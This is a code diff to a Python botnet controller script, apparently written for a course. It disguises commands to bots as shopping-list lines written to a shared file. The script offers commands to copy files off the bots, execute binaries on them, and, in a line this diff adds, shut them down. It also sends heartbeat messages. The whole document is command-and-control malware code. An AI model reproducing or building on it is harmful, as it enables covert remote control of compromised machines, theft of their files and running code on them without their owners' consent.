@@ -6,6 +6,7 @@
 # Plagiarism is a sin!
 #
 
+import os
 import sys
 from Connection import Connection
 import threading
@@ -26,15 +27,15 @@ def heartbeat(period, connection, shopping_list, negative_counter):
         # send ALIVE command
         if not connection.append_to_file(shopping_list, "on " + str(local_counter) + " day buy alive cat\n"):
             is_ok = False
-            print("\n\033[41mCould not sent heartbeat. Try it again.\n\033[0m")
+            print("\033[41mcould not sent heartbeat\033[0m", end='')
         else:
-            print("\n\033[42mheartbeat sent. \033[0m")
+            print("\033[42mheartbeat sent\033[0m", end='')
 
         # Wait for 60 seconds
         time.sleep(period)
 
         if is_ok:
-            print("\n\033[42mm10 bots here.  \033[0m")
+            print("\033[42mm10 bots here.\033[0m", end='')
 
 
 def main():
@@ -90,6 +91,7 @@ def main():
     print("id              ID of current user")
     print("copy <PATH>     copy a file from the bot to the controller")
     print("exec <PATH>     execute a binary inside the bot given the path of the binary")
+    print("end             turn off bots and controller")
     print("")
 
     # start heartbeat
@@ -122,6 +124,8 @@ def main():
         # command w
         elif len(command) == 2 and command[0] == "exec":
             encrypted_command = "on " + str(counter) + " day buy exponents\n"
+        elif len(command) == 1 and command[0] == "end":
+            encrypted_command = "on " + str(counter) + " day buy happy end\n"
         # empty command
         elif len(command) == 0:
             continue
@@ -135,8 +139,10 @@ def main():
             print("Could not write command. Try it again.\n")
             continue
 
-        print("command sent!")
-        print("\n")
+        # end command
+        if command[0] == "end":
+            print("Good bye")
+            os._exit(0)
 
 
 if __name__ == "__main__":
